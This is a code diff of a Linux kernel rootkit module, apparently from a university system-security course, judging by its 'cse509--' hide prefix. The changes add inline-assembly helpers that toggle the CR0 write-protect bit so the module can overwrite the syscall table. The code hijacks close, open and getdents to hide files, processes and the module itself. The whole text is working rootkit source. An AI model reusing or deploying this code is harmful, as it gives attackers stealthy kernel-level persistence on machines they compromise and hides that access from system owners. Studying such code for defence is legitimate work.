@@ -11,6 +11,8 @@
 #include <linux/spinlock.h>
 #include <linux/list.h>
 #include <asm/unistd.h>
+#include <asm/processor-flags.h>
+#include <asm/page.h>
 
 #if defined(__x86_64__)
 #define SYSCALL_TABLE_START 0xffffffff81000000l
@@ -26,6 +28,26 @@ unsigned int **syscall_table;
 
 #define HIDE_PREFIX "cse509--"
 #define BUFSIZE 32768
+
+
+static void make_writeable(void) {
+    unsigned long value;
+    asm volatile("mov %%cr0,%0" : "=r" (value));
+    if (value & 0x00010000) {
+            value &= ~0x00010000;
+            asm volatile("mov %0,%%cr0": : "r" (value));
+    }
+}
+
+static void make_non_writeable(void) {
+
+    unsigned long value;
+    asm volatile("mov %%cr0,%0" : "=r" (value));
+    if (!(value & 0x00010000)) {
+            value |= 0x00010000;
+            asm volatile("mov %0,%%cr0": : "r" (value));
+    }
+}
 
 struct linux_dirent {
     unsigned long       d_ino;
@@ -390,12 +412,13 @@ void deinit_buf_struct(void)
 
 int rootkit_init(void)
 {
+    //struct page *sys_call_page_temp;
     printk("Rootkit loaded\n");
     proc_open_fd = -1;
     proc_open_pid = -1;
     module_hidden = 0;
     hide_files_flag = 0;
-    
+
     init_buf_struct();
     init_hidden_pids_list();
 
@@ -413,12 +436,10 @@ int rootkit_init(void)
         goto out;    
     }
     
-    printk("Syscall table at %p\n", syscall_table);
+    printk("Syscall table at %p %lu\n", syscall_table, read_cr0() & (~(X86_CR0_WP | X86_CR0_PE)));
     
-    
-    // make writable by disabling write protect
-    write_cr0(read_cr0() & (~0x10000));
-    
+    // Disable write protection on page
+    make_writeable();
     // hijack close system call
     original_close = (asmlinkage int (*)(int)) syscall_table[__NR_close];
     syscall_table[__NR_close] = (void *) my_close;
@@ -431,9 +452,7 @@ int rootkit_init(void)
     original_getdents = (asmlinkage int (*)(unsigned int, struct linux_dirent *, unsigned int))
                         syscall_table[__NR_getdents];
     syscall_table[__NR_getdents] = (void *) my_getdents;
-    
-    // enable write protected
-    write_cr0(read_cr0() & 0x10000); 
+    make_non_writeable();
        
     out:
     return 0;
@@ -450,15 +469,14 @@ void rootkit_exit(void)
     }
 
     // Disable write protection on page
-    write_cr0(read_cr0() & (~0x10000));
+    make_writeable();
 
     syscall_table[__NR_close] = (void *) original_close;
     syscall_table[__NR_open] = (void *) original_open;
-
     syscall_table[__NR_getdents] = (void *) original_getdents;
     
     // Enable write protection on page
-    write_cr0(read_cr0() & 0x10000);
+    make_non_writeable();
     
 out:
     show_module();
